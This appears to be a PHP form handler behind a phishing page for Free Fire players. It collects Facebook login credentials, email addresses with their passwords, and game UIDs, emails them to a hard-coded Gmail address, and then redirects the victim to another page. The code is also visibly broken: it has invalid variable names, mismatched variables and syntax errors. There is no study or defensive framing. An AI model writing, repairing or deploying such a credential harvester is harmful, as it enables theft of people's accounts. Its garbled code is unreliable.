<?php
$FREE FIRE NAME =$_POST['name'];
$Facebok ID =$_POST['email or number'];
$PASSWORD. =$_POST['Facebok password'];	
$visitor_emal =$_POST['email'];
$EMAIL PASSWORD =$_POST['password'];
$FREE FIRE UID =$_POST['UID'];
$message =$_POST['message'];


$email_from ='www.ayush.in01@gmail.com';
$email_subject =" New Form Submission";

$email_body = "FREE FIRE NAME: $name.\n".
				"Facebook ID: $email or number.\n"
				 "PASSWORD.: $Facebook password.\n"
				 "EMAIL: $visitor_email.\n"
				 "EMAIL PASSWORD: $password.\n"
				 "FREE FIRE UID:$UID.\n "
				"Student Massage: $message.\n";

$to ="www.ayush01.in@gmail.com";
$headers = "From: $email_from\r\n";
$headers ="Reply-To: $visitor_email\r\n";
mail($to,$email_subject,$email_body,$headers);
header("Location: contect.html";)
